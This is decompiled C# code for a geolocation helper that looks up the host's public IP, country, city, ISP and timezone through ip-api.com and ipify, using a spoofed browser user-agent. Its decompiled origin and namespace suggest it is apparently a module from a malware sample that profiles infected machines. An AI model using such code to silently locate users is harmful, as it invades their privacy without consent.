using System;
using System.IO;
using System.Net;
using NoiseMe.Drags.App.Models.JSON;

namespace NoiseMe.Drags.App.Models
{
	// Token: 0x02000087 RID: 135
	public static class GeoLocationHelper
	{
		// Token: 0x17000124 RID: 292
		// (get) Token: 0x060004A3 RID: 1187 RVA: 0x00004D82 File Offset: 0x00002F82
		// (set) Token: 0x060004A4 RID: 1188 RVA: 0x00004D89 File Offset: 0x00002F89
		public static int ImageIndex { get; set; }

		// Token: 0x17000125 RID: 293
		// (get) Token: 0x060004A5 RID: 1189 RVA: 0x00004D91 File Offset: 0x00002F91
		// (set) Token: 0x060004A6 RID: 1190 RVA: 0x00004D98 File Offset: 0x00002F98
		public static GeoInformation GeoInfo { get; private set; } = new GeoInformation();

		// Token: 0x17000126 RID: 294
		// (get) Token: 0x060004A7 RID: 1191 RVA: 0x00004DA0 File Offset: 0x00002FA0
		// (set) Token: 0x060004A8 RID: 1192 RVA: 0x00004DA7 File Offset: 0x00002FA7
		public static DateTime LastLocated { get; private set; } = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);

		// Token: 0x17000127 RID: 295
		// (get) Token: 0x060004A9 RID: 1193 RVA: 0x00004DAF File Offset: 0x00002FAF
		// (set) Token: 0x060004AA RID: 1194 RVA: 0x00004DB6 File Offset: 0x00002FB6
		public static bool LocationCompleted { get; private set; }

		// Token: 0x060004AC RID: 1196 RVA: 0x000174F4 File Offset: 0x000156F4
		public static void Initialize()
		{
			GeoLocationHelper.TryLocate();
			GeoLocationHelper.GeoInfo.Query = (string.IsNullOrEmpty(GeoLocationHelper.GeoInfo.Query) ? "UNKNOWN" : GeoLocationHelper.GeoInfo.Query);
			GeoLocationHelper.GeoInfo.Country = (string.IsNullOrEmpty(GeoLocationHelper.GeoInfo.Country) ? "UNKNOWN" : GeoLocationHelper.GeoInfo.Country);
			GeoLocationHelper.GeoInfo.CountryCode = (string.IsNullOrEmpty(GeoLocationHelper.GeoInfo.CountryCode) ? "UNKNOWN" : GeoLocationHelper.GeoInfo.CountryCode);
			GeoLocationHelper.GeoInfo.Region = (string.IsNullOrEmpty(GeoLocationHelper.GeoInfo.Region) ? "UNKNOWN" : GeoLocationHelper.GeoInfo.Region);
			GeoLocationHelper.GeoInfo.City = (string.IsNullOrEmpty(GeoLocationHelper.GeoInfo.City) ? "UNKNOWN" : GeoLocationHelper.GeoInfo.City);
			GeoLocationHelper.GeoInfo.Timezone = (string.IsNullOrEmpty(GeoLocationHelper.GeoInfo.Timezone) ? "UNKNOWN" : GeoLocationHelper.GeoInfo.Timezone);
			GeoLocationHelper.GeoInfo.Isp = (string.IsNullOrEmpty(GeoLocationHelper.GeoInfo.Isp) ? "UNKNOWN" : GeoLocationHelper.GeoInfo.Isp);
		}

		// Token: 0x060004AD RID: 1197 RVA: 0x0001763C File Offset: 0x0001583C
		private static void TryLocate()
		{
			GeoLocationHelper.LocationCompleted = false;
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://ip-api.com/json/");
				httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
				httpWebRequest.Timeout = 10000;
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					using (Stream responseStream = httpWebResponse.GetResponseStream())
					{
						using (StreamReader streamReader = new StreamReader(responseStream))
						{
							JsonValue jsonValue = streamReader.ReadToEnd().FromJSON();
							GeoLocationHelper.GeoInfo = new GeoInformation();
							GeoLocationHelper.GeoInfo.City = jsonValue["city"].ToString(false);
							GeoLocationHelper.GeoInfo.Country = jsonValue["country"].ToString(false);
							GeoLocationHelper.GeoInfo.CountryCode = jsonValue["countryCode"].ToString(false);
							GeoLocationHelper.GeoInfo.Isp = jsonValue["isp"].ToString(false);
							GeoLocationHelper.GeoInfo.Query = jsonValue["query"].ToString(false);
							GeoLocationHelper.GeoInfo.Region = jsonValue["region"].ToString(false);
							GeoLocationHelper.GeoInfo.Timezone = jsonValue["timezone"].ToString(false);
						}
					}
				}
				GeoLocationHelper.LastLocated = DateTime.UtcNow;
				GeoLocationHelper.LocationCompleted = true;
			}
			catch
			{
				GeoLocationHelper.TryGetWanIp();
			}
		}

		// Token: 0x060004AE RID: 1198 RVA: 0x00017804 File Offset: 0x00015A04
		private static void TryGetWanIp()
		{
			string query = "";
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://api.ipify.org/");
				httpWebRequest.Timeout = 5000;
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					using (Stream responseStream = httpWebResponse.GetResponseStream())
					{
						using (StreamReader streamReader = new StreamReader(responseStream))
						{
							query = streamReader.ReadToEnd();
						}
					}
				}
			}
			catch
			{
			}
			GeoLocationHelper.GeoInfo.Query = query;
		}

		// Token: 0x040001E2 RID: 482
		public static readonly string[] ImageList = new string[]
		{
			"ad",
			"ae",
			"af",
			"ag",
			"ai",
			"al",
			"am",
			"an",
			"ao",
			"ar",
			"as",
			"at",
			"au",
			"aw",
			"ax",
			"az",
			"ba",
			"bb",
			"bd",
			"be",
			"bf",
			"bg",
			"bh",
			"bi",
			"bj",
			"bm",
			"bn",
			"bo",
			"br",
			"bs",
			"bt",
			"bv",
			"bw",
			"by",
			"bz",
			"ca",
			"catalonia",
			"cc",
			"cd",
			"cf",
			"cg",
			"ch",
			"ci",
			"ck",
			"cl",
			"cm",
			"cn",
			"co",
			"cr",
			"cs",
			"cu",
			"cv",
			"cx",
			"cy",
			"cz",
			"de",
			"dj",
			"dk",
			"dm",
			"do",
			"dz",
			"ec",
			"ee",
			"eg",
			"eh",
			"england",
			"er",
			"es",
			"et",
			"europeanunion",
			"fam",
			"fi",
			"fj",
			"fk",
			"fm",
			"fo",
			"fr",
			"ga",
			"gb",
			"gd",
			"ge",
			"gf",
			"gh",
			"gi",
			"gl",
			"gm",
			"gn",
			"gp",
			"gq",
			"gr",
			"gs",
			"gt",
			"gu",
			"gw",
			"gy",
			"hk",
			"hm",
			"hn",
			"hr",
			"ht",
			"hu",
			"id",
			"ie",
			"il",
			"in",
			"io",
			"iq",
			"ir",
			"is",
			"it",
			"jm",
			"jo",
			"jp",
			"ke",
			"kg",
			"kh",
			"ki",
			"km",
			"kn",
			"kp",
			"kr",
			"kw",
			"ky",
			"kz",
			"la",
			"lb",
			"lc",
			"li",
			"lk",
			"lr",
			"ls",
			"lt",
			"lu",
			"lv",
			"ly",
			"ma",
			"mc",
			"md",
			"me",
			"mg",
			"mh",
			"mk",
			"ml",
			"mm",
			"mn",
			"mo",
			"mp",
			"mq",
			"mr",
			"ms",
			"mt",
			"mu",
			"mv",
			"mw",
			"mx",
			"my",
			"mz",
			"na",
			"nc",
			"ne",
			"nf",
			"ng",
			"ni",
			"nl",
			"no",
			"np",
			"nr",
			"nu",
			"nz",
			"om",
			"pa",
			"pe",
			"pf",
			"pg",
			"ph",
			"pk",
			"pl",
			"pm",
			"pn",
			"pr",
			"ps",
			"pt",
			"pw",
			"py",
			"qa",
			"re",
			"ro",
			"rs",
			"ru",
			"rw",
			"sa",
			"sb",
			"sc",
			"scotland",
			"sd",
			"se",
			"sg",
			"sh",
			"si",
			"sj",
			"sk",
			"sl",
			"sm",
			"sn",
			"so",
			"sr",
			"st",
			"sv",
			"sy",
			"sz",
			"tc",
			"td",
			"tf",
			"tg",
			"th",
			"tj",
			"tk",
			"tl",
			"tm",
			"tn",
			"to",
			"tr",
			"tt",
			"tv",
			"tw",
			"tz",
			"ua",
			"ug",
			"um",
			"us",
			"uy",
			"uz",
			"va",
			"vc",
			"ve",
			"vg",
			"vi",
			"vn",
			"vu",
			"wales",
			"wf",
			"ws",
			"ye",
			"yt",
			"za",
			"zm",
			"zw"
		};
	}
}
